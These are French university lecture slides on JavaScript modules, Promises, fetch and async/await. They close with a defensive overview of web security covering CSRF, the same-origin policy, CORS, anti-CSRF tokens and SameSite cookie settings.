---
title : Cours 4 <br> Compléments JavaScript
subtitle : Modules, Promesses, Sécurité
layout : slideshow
lang: fr
---

<!-- 

class 1 : 36 slides
class 2 : 36 slides
class 3 : 45 slides

TODO : 
* trouver un moyen de tester les codes sur les modules

 -->

<section>

## Plan du cours

Compléments sur l'architecture, l'asynchronisme et la sécurité

**Plan :**

<div style="font-size=120%">
1. Modules JS : `import` / `export`
2. Utilisation de bibliothèques externes
3. `Promise` et `async`/`await`
4. Focus sur `fetch`
5. Sécurité : attaque `CSRF` et contre-mesure `CORS`

</div>

</section>
<section>

# Modules ECMAScript (ESM)

</section>
<section>

<!-- https://javascript.info/modules-intro -->

## Utilité des modules 


Modules : Mécanisme pour diviser les programmes JavaScript en plusieurs morceaux qui peuvent s'importer les uns dans les autres. 

<div class="incremental">
<div style="margin:40px 0px">
Fonctionnalité présente notamment dans `Node.js` depuis longtemps.

Prise en charge par les navigateurs avec le système de modules ESM (ECMAScript
Module), apparu dans la norme du langage ES6 en 2015.
</div>

<div>
Un script JS déclaré comme module peut utiliser :
* `import` permet d'importer des fonctionnalités d'autres modules.
* `export` désigne les variables et les fonctions qui doivent être accessibles
depuis l'extérieur du module en cours.
</div>
</div>



</section>
<section>

## Syntaxe de base pour `export` et `import`

Placer `export` devant n'importe quelle déclaration (variable, fonction ou classe)

```js
// 📁 export.js
// exporte une variable, par ex. un tableau
export let months = ['Jan', 'Feb', 'Mar','Apr', 'Aug', 'Sep', 'Oct', 'Nov', 'Dec'];

// exporte une constante
export const MODULES_BECAME_STANDARD_YEAR = 2015;

// exporte une classe
export class User {constructor(name) {this.name = name;}}
```

Import par liste des noms
```js
import {months, MODULES_BECAME_STANDARD_YEAR, User} from './export.js';
```
Nom de module : 
* soit URL relative qui commence par `/`, `./`, ou `../`
* soit URL absolue

</section>
<section>

## Chargement de modules

`<script type="module">` pour indiquer au navigateur qu'un script doit être traité
comme un module

```html
<!-- 📁 index.html -->
<!doctype html>
<script type="module">
  import {sayHi} from './say.js';

  document.body.innerHTML = sayHi('John');
</script>
```
```js
// 📁 say.js
export function sayHi(user) {
  return `Hello, ${user}!`;
}
```

Le navigateur récupère et évalue automatiquement le module importé (et ses importations si nécessaire), puis exécute le script.

</section>
<section>

## Autres syntaxes pour `export` et `import`

1. Export séparé des déclarations
   
   ```js
   // say.js
   function sayHi(user) { alert(`Hello, ${user}!`); }
   
   function sayBye(user) { alert(`Bye, ${user}!`); }
   
   export {sayHi, sayBye}; // liste de variables exportées
   ```
   
2. Importer tout dans un objet
   ```js
   import * as say from './say.js';
   say.sayHi('John');
   say.sayBye('John');
   ```
3. Import avec un alias
   ```js
   import {sayHi as hi, sayBye as bye} from './say.js';
   hi('John'); // Hello, John!
   bye('John'); // Bye, John!
   ```

</section>
<section>

## Export et import par défaut

Syntaxe `export default` pour les modules qui n'exportent qu'une seule chose

```js
// 📁 user.js
export default class User { // export default
  constructor(name) {
    this.name = name;
  }
}
```
```js
// 📁 main.js
import User from './user.js'; // Pas {User}, juste User
new User('John');
```

Accolades pour les imports d'exports nommés 
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
*vs.* 
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
Pas d'accolades pour les imports d'exports par défaut.  

Par convention, le nom d'une variable exportée par défaut correspond à celui de son fichier
```js
import User from './user.js';
import LoginForm from './loginForm.js';
import func from '/path/to/func.js';
```

</section>
<section>

## Caractéristiques de base des modules

* Toujours `use strict` : 
  * Variante moderne mais plus restrictive de JavaScript
  * Lève des exceptions à la place de certaines erreurs silencieuses, par exemple l'affectation de variables non déclarées
  * Permet aux moteurs JavaScript d'effectuer des optimisations
  * Prévoit les prochaines versions d'ECMAScript

* Portée limitée au niveau du module  
  Les variables et fonctions globales d’un module ne sont pas visibles dans les autres scripts.

* Le chargement des modules est différé, comme `defer`
  
* Pas de module avec le protocole `file://`, sinon erreur CORS (*cf.* suite du cours)
  
<!-- * Dans le navigateur, aucun module *bare* (*brut*) n'est autorisé :
l'importation doit obtenir une URL relative ou absolue.  
  TODO: repousser au moment des autres syntaxes ? -->

</section>
<section>

## Un module n'est évalué que la première fois

<!-- Plutôt notes complémentaires ? -->

Le code d'un module n'est évalué que la première fois lorsqu'il est importé.

```js
// 📁 admin.js
export let admin = {
  name: "John"
};
```

Lors du premier `import`, le script `admin.js` est évalué et l'objet `admin` est créé.  
Tous les importateurs reçoivent exactement ce seul et unique objet `admin` :

```js
// 📁 1.js
import {admin} from './admin.js';
admin.name = "Pete";
```
```js
// 📁 2.js
import {admin} from './admin.js';
alert(admin.name); // Pete
// 1.js et 2.js font références au même objet admin
// Les changements fait dans 1.js sont visibles dans 2.js
```
Utilisé en pratique pour configurer des bibliothèques.

<!-- 
Comment tester facilement les modules ?
-->

<!-- Ce comportement est en fait très pratique, car il nous permet de configurer les modules.

Voici le modèle classique :

Un module exporte un moyen de configuration, par exemple un objet de configuration.
Lors de la première importation, nous l'initialisons, en écrivant dans ses propriétés. Le script d'application de premier niveau peut le faire.
Les importations suivantes utilisent le module. -->

</section>
<section>

# Utilisation de bibliothèques externes

</section>
<section>

## Exemple d'installation de `three.js`

**Exemple :**  

* Installation de la bibliothèque `three.js` à l'aide du *node package manager* `npm`
  
  ```bash
  npm install three
  ```
  → génère méta-informations `package.json`, installe `three` dans `node_modules`
  
* Utilisation de la bibliothèque
  ```js
  // js/main.js
  import * as THREE from 'three';
  // ... code utilisant three
  ```
  ```html
  <!-- index.html -->
  <script type="module" src="main.js"></script>
  ```
  
* **Mais** ça ne marche pas !


</section>
<section>

## Les paquets `npm` ne marchent pas dans le navigateur ?

`npm` est historiquement fait pour exécuter des bibliothèques JS dans `Node`, pas dans votre site Web :
- **Pas de résolution de modules :**  
  Les navigateurs ne comprennent pas `import 'three'`, mais seulement les URL absolues ou relatives qui commencent par `/`, `./`, ou `../`.

- **Format incompatible :**  
  Avant les modules ECMAScript, la communauté JS avait inventé divers systèmes de modules.  
  **CommonJS** est le système de module créé pour Node.js, non pris en charge par les navigateurs.  
  La majorité des bibliothèques `npm` sont au format **CommonJS** (`require`, `module.exports`).  


- **Pas de système de paquets natif :**  
  `npm` est un outil *Node.js*. Les navigateurs ne savent pas accéder au registre `npm`, ni gérer les dépendances.

<div class="incremental">
<div>
**Solution :**
* Simple : Utiliser un Content Delivery Network (CDN) compatible avec le format ESM, par ex. [jsDelivr](https://www.jsdelivr.com/esm) ou [esm.sh](https://esm.sh/).
* Professionnelle (*cf.* an prochain parcours A & D) : 
  * Outil de construction (build) pour convertir entre systèmes de modules
  * Serveurs de développement pour reconstruire à la volée 
</div>
</div>


<!-- 
Démo avec /home/lebreton/Enseignement/R4.01-JavaScript/TestsModules/threeJSNode ?

Outil de construction (*build*) pour transformer un paquet au format ESM :

* soit construction en direct avec un serveur de développement
  ```bash
  npx vite
  ```
  (Montrer les transformations)
  
* soit construction, par ex. pour le déploiement
  * Construction nous-même 
  ```bash
  npx vite build 
  npx serve dist
  ```
  
  * Utilisation des CDN (*Content Delivery Network*)
  soit on se sert des CDN (JSDelivr, qui ont compilé pour nous

  TODO : Démo ?sans importmap → je n'y arrive pas !?
  https://esm.run/three
  https://esm.run/three-addons 


Voir aussi sur JavaScript.info: [Introduction aux modules](https://javascript.info/modules-intro#build-tools)
-->

</section>
<section>

# Promesses

</section>
<section>


## Problèmes des *callback*

<div style="display:flex">
<div>

**Problèmes des fonctions de rappels (*callback*) pour la programmation asynchrone :**

Le code est difficile à gérer en cas d'appels imbriqués et de gestion d'erreur
avec des *callback*.

<br>

Exemple de "*callback hell* (ou *pyramid of doom*") lors du TD6 (Pokemon). →

</div>
<div style="font-size:68%; width:720px;flex-shrink:0">

```js
function addEvolutionChain(nameOrIndex) {
    // requête 1 ...
    xhr1.open('GET', '...');
    xhr1.onload = function () {
        if (xhr1.status === 200) {
            // requête 2 ...
            xhr2.open("GET", '...');
            xhr2.onload = function () {
                if (xhr2.status === 200) {
                    for (const speciesUrl of getSpeciesUrls('...')) {
                        // requête 3 ...
                        xhr3.open("GET", '...');
                        xhr3.onload = function () {
                            if (xhr3.status === 200) {
                              // ...
                            } else {
                                console.log(Error(xhr3.statusText));
                            }
                        }
                        xhr3.send();
                    }
                } else {
                    console.log(Error(xhr2.statusText));
                }
            }
            xhr2.send();
        } else {
            console.log(Error(xhr1.statusText));
        }
    }
    xhr1.send();
}
```

</div>

</div>

</section>
<section>

## Promesse : construction

<!-- 
Romain : Commencer par les états pending/fulfilled/rejected avant de parler de l'exécuteur ? 
-->

```js
new Promise(
  function executor(resolve, reject) {
    // L'exécuteur : action asynchrone qui prend du temps
  }
);
```
* La fonction passée à `new Promise` est appelée *l’exécuteur*. 
  
* Le constructeur de `Promise` lance automatiquement l'exécuteur.

* Quand l’exécuteur a terminé, il appelle une des deux fonctions de retour :

  * s'il obtient le résultat `value`, il *tient la promesse* avec `resolve(value)`.
 
  * si une erreur `error` est survenue, il *rompt la promesse* avec `reject(error)`.
  

<!-- 
**Remarque Romain :**  
Pourquoi donne-t-on des fonctions `resolve` et `reject` à l'exécuteur ? 
C'est le moyen proposé pour que l'exécuteur puisse interagir avec la promesse en cours de construction.
-->

</section>
<section>

## Promesse : propriétés internes

L’objet `promise` retourné par le constructeur `new Promise` a des propriétés internes :

<div style="display:flex">
<div>

* `state` (état) : initialement à `"pending"` (en attente), se change 
  * soit en `"fulfilled"` (tenue) lorsque `resolve` est appelé
  * soit en `"rejected"` (rompue) si `reject` est appelé.

* `result` : initialement à `undefined`, se change 
  * en `value` quand `resolve(value)` est appelé
  * ou en `error` quand `reject(error)` est appelé.

</div>
<div>
<object type="image/svg+xml" data="{{site.baseurl}}/assets/class4/promise-resolve-reject.svg" width="500" height="246" class="image__image" data-use-theme="" class="centered">
</object>
</div>
</div>

<div class="incremental switch">
<div>
**Exemple 1:**
```js
let promise = new Promise(function(resolve, reject) {
  // la fonction est exécutée automatiquement quand la promesse est construite

  // On signale au bout de 5 secondes que la tâche est terminée avec le résultat "done"
  setTimeout(() => resolve("done"), 5000);
});
```
**Démo :** Afficher la `promise` tout de suite après (*pending*), ou cinq secondes plus tard (*fulfilled* avec la valeur *done*).
</div>

<div>
**Exemple 2:**
```js
let promise = new Promise(function(resolve, reject) {
  // On signale après 5 secondes que la tâche est terminée avec une erreur
  setTimeout(() => reject(new Error("Whoops!")), 5000);
});
```
**Démo :** Afficher la `promise` tout de suite après (*pending*), ou cinq secondes plus tard (*rejected* avec l'erreur *Whoops!*).
</div>
</div>

</section>
<section>

## Abonnement avec `.then`

On abonne une fonction consommatrice à une promesse avec `.then`. 

Une fonction consommatrice recevra un résultat ou une erreur quand l'exécuteur aura terminé. 

```js
promise.then(
  function(result) { /* gère un résultat correct */ },
  function(error) { /* gère une erreur */ }
);
```
<!-- Le premier argument de .then est une fonction qui se lance si la promesse est tenue, et reçoit le résultat.
Le deuxième argument de .then est une fonction qui se lance si la promesse est rompue, et reçoit l’erreur. -->


<div class="incremental switch">
<div>
**Exemple 1:**
```js
let promise = new Promise(function(resolve, reject) {
  setTimeout(() => resolve("done!"), 1000);
});

// resolve lance la première fonction dans .then
promise.then(
  result => alert(result), // affiche "done!" après 1 seconde
  error => alert(error) // ne se lance pas
);
```
</div>
<div>
**Exemple 2:**  
Pour traiter seulement les *promesses tenues*, donnez une fonction en argument à `.then` :

```js
let promise = new Promise((resolve,reject) => {
  setTimeout(() => resolve("done!"), 1000);
});

promise.then(alert); // affiche "done!" après 1 seconde
// équivalent à
// promise.then(alert, null);
```
</div>
<div>
**Exemple 3:**  
Pour traiter seulement les *erreurs*, on utilise `.catch` :

```js
let promise = new Promise((resolve,reject) => {
  setTimeout(() => reject(new Error("Whoops!")), 1000);
});

promise.catch(alert); // affiche "Whoops!" après 1 seconde
// équivalent à
// promise.then(null, alert);
```
Il existe aussi `.finally(f)` similaire à `.then(f, f)`
</div>
</div>
<!-- Note : alert au lieu de result => alert(result) -->
</section>
<section>

## Avantages des promesses

**Avantage 1 :**  
Les promesses nous permettent de faire des choses dans un ordre naturel.
D’abord, nous lançons la promesse, puis nous indiquons que faire du résultat
avec `.then`.

Avec les *callback*, nous devons d'abord dire que faire du résultat avant que
d'exécuter l'action asynchrone.

<br>

**Avantage 2 :**  
Nous pouvons appeler `.then` sur une promesse autant de fois que nécessaire,
pour abonner de nouvelles fonctions consommatrices.

Avec les fonctions de retour, il ne peut y avoir qu’un seul *callback*.

<br>
<br>

**Remarque :**
`Promise.then(onFullfilled, onRejected)` se rapproche un peu d'un gestionnaire d'évènements 
```js
// Le code suivant ne marche pas mais est proche dans l'esprit
promise.addEventListener("fulfilled", onFullfilled)
promise.addEventListener("rejected", onRejected)
```
Cependant, c'est comme si une promesse n'émettait l'un des 2 évènements `fulfilled`/`rejected` une seule fois.

</section>
<section>

## L’enchaînement de promesses

<!-- On ne comprend pas très bien la technique derrière, le sujet est centré sur l'utilisation -->

Un appel à `.then` renvoie une nouvelle promesse, sur laquelle nous pouvons appeler `.then`.

```js
let p2 = p.then(handler)
p2.then(handler2)
// Ou, plus simplement
p.then(handler).then(handler2)
```

En pratique, la fonction `handler` renvoie souvent une promesse `p3`.  
Dans ce cas, la promesse `p2` renvoyée par `p.then(handler)` sera liée à `p3`.

```js
new Promise( (resolve, reject) => setTimeout(() => resolve(1), 1000))
  .then( (result) => {
    alert(result); // 1
    return new Promise((resolve, reject) => setTimeout(() => resolve(result * 2), 1000))
  })
  .then( (result) => {
    alert(result); // 2
    return new Promise((resolve, reject) => setTimeout(() => resolve(result * 2), 1000))
  })
  .then(alert)
```

<!-- 
Se concentrer sur les exemples où les handler retournent une promesse 
Voir pour une syntaxe équivalente où handler renvoie p2, puis p2.then(...)
-->

<!-- Rappel : Syntaxe équivalente à l'enchainement

```js
let p1 = new Promise(function(resolve, reject) {
  setTimeout(() => resolve(1), 1000);
})

let p2 = p1.then(function(result) {
  alert(result); // 1
  return new Promise((resolve, reject) => { // (*)
    setTimeout(() => resolve(result * 2), 1000);
  });
})

let p3 = p2.then(function(result) { // (**)
  alert(result); // 2
  return new Promise((resolve, reject) => {
    setTimeout(() => resolve(result * 2), 1000);
  });
})

p3.then(function(result) {
  alert(result); // 4
});
``` -->

</section>
<section>

## Renvoi de promesses

<!-- 
Question : 
.then renvoie une promesse p tout de suite alors que onFulfilled renverra une promesse p2 plus tard. 

Il faut donc lier les 2 promesses avec 
p = new Promise((resolve, reject) => {
  let p2 = onFullfilled(value);
  p2.then( (value) => resolve(value), (error) => reject(error))
}) 

Donc .then a besoin de .then pour se coder ???

Chercher des solutions dans 
https://promisesaplus.com/implementations
https://github.com/glebec/potential?tab=readme-ov-file#promisethen

-->

<p class="centered">
<img src="{{site.baseurl}}/assets/class4/promise-handler-variants.svg" alt="" width="1000" height="600">
</p>

</section>
<section>

## API `Promise`

<!-- Après async/await et fetch ? -->
 
1. `Promise.all` prend un tableau de promesses et renvoie une nouvelle promesse.

   ```js
   let promise = Promise.all(tableau_promesses);
   ```
   
   Si l’une des promesses est rejetée, la promesse retournée est rejetée
   immédiatement avec cette erreur.

   Sinon la nouvelle promesse est résolue lorsque toutes les promesses sont
   résolues. Le tableau de leurs résultats devient son résultat.
   
2. `Promise.allSettled(promises)` (ajout récent) – attend que
   toutes les promesses se règlent et retourne leurs résultats sous forme de
   tableau d’objets avec : 
   * `state`: `"fulfilled"` ou `"rejected"`
   * `value` (si rempli) ou `reason` (en cas de rejet).
  
3. `Promise.race(promises)` – attend la première promesse réglée, et son
   résultat/erreur devient le résultat.

4. `Promise.any(promises)` (ajout récent) – attend la première
   promesse qui se réalise, et son résultat devient le résultat. Si toutes les
   promesses données sont rejetées, `AggregateError` devient l’erreur de
   `Promise.any`.


</section>
<section>

## Boucle d'évènement

Lorsqu’une promesse est prête, les `handler` lancés par `then` sont mis dans la file d’attente des *micro-tâches*.  
(Valable aussi pour les promesses créées par un `await`)

<div class="incremental switch">
<div>
Boucle d'événements (Rappel):
> 1. Tant qu’il y a des *macro-tâches* :  
     1. Exécution de la *macro-tâche* la plus ancienne jusqu'à son terme.
     2. Mise à jour du rendu
> 2. Attend jusqu’à ce qu’une *macro-tâche* apparaisse, puis repasse à 1.
</div>
<div>
Boucle d'événements (Complétée):
> 1. Tant qu’il y a des *macro-tâches* :  
     1. Exécution de la *macro-tâche* la plus ancienne jusqu'à son terme.
     2. Tant qu’il y a des *micro-tâches* :
        1. Exécution de la *micro-tâche* la plus ancienne jusqu'à son terme.
     3. Mise à jour du rendu
> 2. Attend jusqu’à ce qu’une *macro-tâche* apparaisse, puis repasse à 1.
</div>
</div>

</section>
<section>

## Boucle d'évènement : exemple

**Exemple :** Qu'affiche le programme suivant ?

```js
setTimeout(() => console.log("Étape 1."), 0);
let promesseImmediatementResolue = new Promise( (resolve) => resolve(""));
// Ou promesseImmediatementResolue = Promise.resolve("")

promesseImmediatementResolue.then(() => console.log("Étape 2."));
console.log("Étape 3.");
```


<div class="incremental">
<div>

**Réponse :** Étape 3 → Étape 2 → Étape 1.

</div>
<div>

**Pourquoi ?**  
1. Le *callback* de `setTimeout` n'est pas exécuté tout de suite, il est rajouté sur la file d'attente des macrotâches.  
1. Le gestionnaire de la promesse n'est pas exécuté tout de suite, il est rajouté sur la file d'attente des microtâches.  
1. On affiche `Étape 3`. Fin de la macrotâche = exécution du script.  
1. On dépile une microtâche. Affichage de `Étape 2`. Fin de la microtâche.  
1. On dépile une macrotâche. Affichage de `Étape 1`.


[Visualisation de la file des tâches avec l'outil `JavaScript Visualizer 9000`](https://www.jsv9000.app/?code=c2V0VGltZW91dChmdW5jdGlvbiBmMSgpIHtjb25zb2xlLmxvZygiyXRhcGUgMS4iKX0sIDApOwoKUHJvbWlzZS5yZXNvbHZlKCkKICAudGhlbihmdW5jdGlvbiBmMigpIHtjb25zb2xlLmxvZygiyXRhcGUgMi4iKX0pOwogIApjb25zb2xlLmxvZygiyXRhcGUgMy4iKTs%3D)


</div>
</div>



</section>
<section>

# `fetch`

</section>
<section>

## Interface de `fetch`


`fetch(url)` fait une requête réseau à l'URL et renvoie une promesse. 

La promesse se résout avec un objet `response` de prototype `Response` lorsque le serveur distant répond
avec des en-têtes, mais *avant le téléchargement complet de la réponse* :
* `response.status` – Code HTTP de la réponse,
* `response.ok` – `true` est le statut 200-299,
* `response.headers` – objet avec en-têtes HTTP.

La promesse d'obtenir plus tard le corps de la réponse est disponible grâce à :
* `response.text()` – lit la réponse et retourne sous forme de texte,
* `response.json()` – analyse la réponse en JSON,


</section>
<section>

## Requête POST 

<div style="display:flex;font-size:90%;">
<div>
Envoi de formulaire

```js
let htmlForm = $("form");
let formData = new FormData(htmlForm);
formData.append("prenom", "Marc");
formData.append("nom", "Assin");

async function submit() {
  let response = await fetch('/form.php', {
    method: 'POST',
    body: formData
  });
  let result = await response.text();
  alert(result.message);
}
```
</div>
<div>
Envoi / réception de JSON

```js
let user = {
  prenom: 'Marc',
  nom: 'Assin'
};

async function submit() {
  let response = await fetch('/api.php', {
    method: 'POST',
    body: JSON.stringify(user)
    headers: {
      'Content-Type': 'application/json'
    },
  });
  let result = await response.json();
  alert(result.message);
}
```
</div>
</div>

</section><section>

# `async`/`await`

</section>
<section>

## Utilité de `async`/`await`

La syntaxe `async`/`await` sert principalement à enchaîner et
gérer des promesses de manière plus lisible et intuitive.

Elle permet d'écrire du code asynchrone qui se lit comme du code
synchrone, évitant les chaînes de `.then()`.

<br>

**Exemple du TD6 :**

<div style="display:flex;font-size:82%">
<div>
```js
function getEvolutionChain(nameOrIndex) {
  fetch(`pokemon-species-url`)
    .then(response => response.json())
    .then(data => fetch(data.evchain_url))
    .then(response => response.json())
    .then(data => data.chain)
    .catch(error => console.log(error));
}
```
</div>
<div>
```js
async function getEvolutionChain(nameOrIndex) {
  try {
    const specResp = await fetch(`pokemon-species-url`);
    const specData = await specResp.json();
    const evChainResp = await fetch(specData.evchain_url);
    const evChainData = await evChainResp.json();
    return evChainData.chain;
  } catch (error) {
    console.log(error);
  }
}
```
</div>
</div>

<!-- La lecture du résultat d'une promesse est plus lisible en async/await -->

</section>
<section>


## `async`


<p class="centered">
<img src="{{site.baseurl}}/assets/class4/async-return-promise.svg" alt="async renvoie toujours une promesse" width="1000" height="600">
</p>
</section>
<section>

## `await` d'une promesse résolue

Dans une fonction `async`, on peut utiliser le mot-clé `await` avant une promesse.

Le mot-clé `await` fait en sorte d'attendre que cette promesse se réalise et renvoie son résultat.

```js
let value = await promise;
```

C’est juste une syntaxe plus facile pour obtenir le résultat de la promesse
que `promise.then`.

<div style="display:flex;align-items:flex-start;justify-content:space-evenly;">
```js
function f1() {
  // code 1 ...
  return promesse1;
}
function f2(var1) {
  // code 2 ...
  return promesse2;
}
function f3(var2) {
  // code 3 ...
  return promesse3;
}
```

```js
async function f() {
  let var1 = await f1();
  let var2 = await f2(var1);
  return f3(var2);
}

f()
// est équivalent à 
f1().then(var1 => f2(var1)).then(var2 => f3(var2))
```
</div>

**Remarque :** 
Les navigateurs modernes permettent d'utiliser `await` dans
les modules hors d'une fonction `async`.

<!-- 
Et rajouter de la gestion d'exception

Prendre exemples de l'examen

Voir exos JS.info

Comment les générateurs gèrent les exceptions ?
await Promesse failed lance une exception non ? 

-->


</section>
<section>

## `await` d'une promesse rompue

Si une promesse se résout normalement, alors `await promise` renvoie le
résultat.  
Mais dans le cas d’un rejet, il jette l’erreur, comme s’il y avait une
instruction `throw` à cette ligne.

Le code suivant
```js
async function f() {
  let promesseRompue = new Promise(
    function(resolve, reject) {
      reject(new Error("Whoops!"));
  }); // Ou promesseRompue = Promise.reject(new Error("..."))

  await promesseRompue;
}
```
est équivalent à
```js
async function f() {
  throw new Error("Whoops!");
}
```
→ On traite les promesses rompues avec des `try`/`catch`, comme dans un code synchrone.

<!-- 

[Source sur JavaScript.info](https://fr.javascript.info/async-await)

```js
p.then(function onFulfilled (value) { }, function onRejected(reason) { } )
// équivalent à ???
async function () {
  try{
    let value = await p;
    onFulfilled(value);
  } catch (reason) {
    onRejected(reason);
  }
}
```

-->


</section>
<section>

# Sécurité Web

</section>
<section>

## Menaces sur les sites / applications Web

**Menaces les plus connues :**
* la compromission des ressources : modifier le site pour remplacer le contenu légitime par un contenu choisi par
  l’attaquant.
* le vol de données : perte de la confidentialité de certaines données (authentifiant, informations
  personnelles/bancaires, ...).
* le déni de service : rendre indisponible le site attaqué.

**Classes d'attaques courantes :**
* SQLi (injection SQL) : transmission de code malveillant parmi les données
  qu'attend un serveur web pour déclencher une requête de BD.  
  Contre-mesures : Requêtes préparées, ...

* XSS (*Cross-Site Scripting*) : le navigateur d'un utilisateur du site va
  interpréter des données malicieuses (par ex. JS ou HTML) pour provoquer un
  comportement particulier. Vise à récupérer des *secrets* ou à effectuer des
  actions en leur nom.  
  Contre-mesures : `textContent`, `setAttribute`, `encodeURIComponent`, ...

* CSRF (*Cross-Site Request Forgery*) : force un utilisateur à exécuter, à son
  insu, des actions privilégiées sur un autre site sur lequel il est
  authentifié. Ce type d’attaques a lieu lors de la navigation sur un site piégé
  qui émet des requêtes vers un site de confiance, mais vulnérable au CSRF.
{:.incremental}


</section>
<section>

## Exemple de Cross-Site Request Forgery (CSRF)

<div class="incremental switch">
<div>
**Scénario classique**

<p class="centered">
<img src="{{site.baseurl}}/assets/class4/form-post.svg" alt="" width="1000" height="500">
</p>

</div>
<div>
**Attaque CSRF** : Une requête silencieuse est lancée, par exemple avec `fetch`.

<p class="centered">
<img src="{{site.baseurl}}/assets/class4/csrf-form-post.svg" alt="" width="1000" height="500">
</p>

Concerne les requêtes qui changent l’état de l’application.

</div>
</div>

</section>
<section>

## Politique de sécurité Same-Origin Policy (SOP)

**Définition de l'origine**

<p class="centered">
<img src="{{site.baseurl}}/assets/class4/url-object.svg" alt="" >
</p>

<br>

***Same-Origin Policy* (SOP)**

Un document/script de `origine1` veut interagir avec une autre
ressource chargée depuis `origine2` : 
* Si même origine : pas de restriction
* Si origine différente (*Cross-Origin*) : stratégie de contrôle paramétrable
  par le mécanisme *Cross-Origin Resource Sharing* (CORS).

<br>

**Attention :** Si l'une des origines a le protocole `file://`, alors la requête est toujours considérée *cross-origin*.

<br>

Dans la suite, nous allons nous focaliser sur `fetch`/`XMLHttpRequest` et les cookies.

</section>
<section>

## Fetch: Requêtes *cross-origin*

Il existe deux **types de requêtes** `fetch` *cross-origin* :
1. Les requêtes simples, qui correspondent en gros aux requêtes qu'un formulaire pourrait envoyer.
2. Toutes les autres. 

<!-- 
méthodes simples avec en-têtes simple 

qui correspondent généralement aux
requêtes émissibles sans l’aide de JavaScript

, c’est-à-dire dont l’émission ne devrait pas changer l’état de l’application comme peuvent le faire, par convention, les verbes
HTTP POST, PUT, DELETE par exemple.
-->

<br>

Une requête est **simple** si elle remplit deux conditions :
1. Méthode simple : `GET`, `POST` ou `HEAD`
2. En-têtes simples : les seuls en-têtes de requête personnalisés autorisés sont
   * `Accept`,
   * `Accept-Language`,
   * `Content-Language`,
   * `Content-Type` avec la valeur `application/x-www-form-urlencoded`, `multipart/form-data` ou `text/plain`.


</section>
<section>

## Fetch: Requêtes *cross-origin* simples

<div style="display:flex; align-items:center;">
<div>
Demande d'autorisation du navigateur au serveur :

1. Le navigateur ajoute toujours l’en-tête `Origin` à la requête.

1. Si le serveur veut accepter la requête, il ajoute l’en-tête `Access-Control-Allow-Origin` à la réponse, de valeur l’origine autorisée ou `*`.

1. Le navigateur vérifie `Access-Control-Allow-Origin` et autorise ou non JavaScript à accéder à la réponse.

</div>
<div>
<img src="{{site.baseurl}}/assets/class4/xhr-another-domain.svg" alt="" >
</div>
</div>

Donc on peut toujours envoyer une requête simple, mais il faut l'autorisation que JS puisse lire la réponse.

→ 💀 Risque si la requête simple change l'état de l'application.

→ 🔒 Pas de risque qu'une attaque CSRF lise la réponse (si le serveur refuse l'autorisation).

</section>
<section>

## Fetch: Requêtes *cross-origin* non simples




<div style="display:flex; align-items:flex-start;">
<div>
N’importe quelle méthode HTTP : PATCH, PUT, DELETE, ... 
→ Utile pour accéder à une API Rest

<br>

1. le navigateur envoie une requête préalable (*preflight*) de méthode OPTIONS, demandant l’autorisation.

2. Le serveur peut accepter la requête ou non.

3. En fonction, le navigateur envoie la requête véritable et JS peut lire la réponse.

<br>

→ 🔒 Pas de risque qu'une attaque CSRF envoie la requête, ni qu'il ait une réponse (si le serveur refuse l'autorisation).

</div>
<div>
<img src="{{site.baseurl}}/assets/class4/xhr-preflight.svg" alt="" height="600px">
</div>
</div>

</section>
<section>

## Recommandations de sécurité

**Conséquence :** Les requêtes qui changent l'état de l'application doivent être protégées.

<br>

**Solution 1**  
Les requêtes qui changent l'état de l'application ne doivent pas être des requêtes simples.  
→ Méthode `PATCH`, `PUT`, `DELETE`, ou en-tête supplémentaire  
⚠️ Navigation difficile, nécessite d'utiliser `fetch` pour toutes ces requêtes, plutôt pour les API.

<br>

**Solution 2**  
Les requêtes qui changent l'état de l'application doivent être protégées par des jetons anti-CSRF.

Exemple de fonctionnement de jeton anti-CSRF pour un formulaire : 
1. Le client demande la page qui affiche le formulaire.  
2. Le serveur inclus un `<input type="hidden">` contenant un jeton anti-CSRF aléatoire.
3. Le client enverra automatiquement le jeton anti-CSRF lors de la soumission du formulaire.  
4. Le serveur vérifie ce jeton avant d'effectuer l'action qui change l'état.

Pourquoi ça marche ?  
Un attaquant CSRF ne peut pas lire les réponses d'une requête *cross-origin* (si le serveur est bien codé).   

<!-- https://javascript.info/cookie -->
<!-- https://developer.mozilla.org/en-US/docs/Web/Security/Attacks/CSRF -->
<!-- https://developer.mozilla.org/en-US/docs/Web/Security/Attacks/CSRF#defenses_against_csrf -->

</section>
<section>

## Sécurisation des identifiants dans les cookies

**Mécanisme 1: Domaine d'un cookie**  
Un cookie est lié au *hostname* (ou un sous-domaine) du serveur qui l'a déposé → n'empêche pas une attaque CSRF

**Mécanisme 2: Option *Same-Site***
* On regarde l'URL de la page courante du navigateur, et l'URL de la requête `fetch` (ou `<img>`, `<script>`...)
* La requête est *same-site* si les 2 URL ont le même Top-Level Domain (TLD) et le même protocole.

  **Exemple :**
  Navigateur sur le site `https://blog.site.fr/`, requête sur l'URL `https://forum.site.fr/`  
  *Same-site* car ils ont le même Top-Level Domain (TLD) `site.fr` et le même protocole.  
  ⚠️ *same-site* ≠ *same-origin*


* Option *SameSite* des cookies, valeur :
  * `Strict` : cookie n'est envoyé que si *same-site*
  * `Lax` : `Strict` + requêtes "sûres" (requêtes de navigation (qui change l'URL de la page) de méthode `GET`)
    Utile pour apparaître connecté quand on arrive sur un site.
  * `None` : pas de contraintes, nécessite `Secure` activé, exemple : cookies publicitaires, de suivi...

<!-- En fait requêtes sûres :  GET, HEAD, OPTIONS, and TRACE -->

**Recommandation :** `SameSite=Strict`, ou `Lax` si le cookie n’autorise pas d’action privilégiée via la méthode `GET`.  
→ 🔒 Peu de risque de CSRF car pas d'identification via les cookies.

**Attention :** ⚠️ *SameSite* non supporté par les vieux navigateurs d'avant 2017 ([5% des clients Web en 2025](https://caniuse.com/same-site-cookie-attribute)).

</section>
<section>

## Sécurisation des identifiants dans les cookies

Autres options de sécurité des cookies : 

* *Secure* (désactivé par défaut) : Le cookie est envoyé seulement avec les requêtes HTTPS.

  Si un cookie a un contenu sensible, il ne devrait pas être envoyé sur HTTP (risque d'écoute du réseau)

  Les requêtes HTTP ne peuvent pas déposer de cookie *Secure* (risque de modification du cookie)
  <!-- Pas de garantie (voir class4-complement) d'intégrité, de confidentialité sans HTTPS -->
  <!-- Si une requête ultérieure en HTTP, Set-Cookie non sûr donc on ne veut pas qu'il puisse écraser un cookie existant -->
  
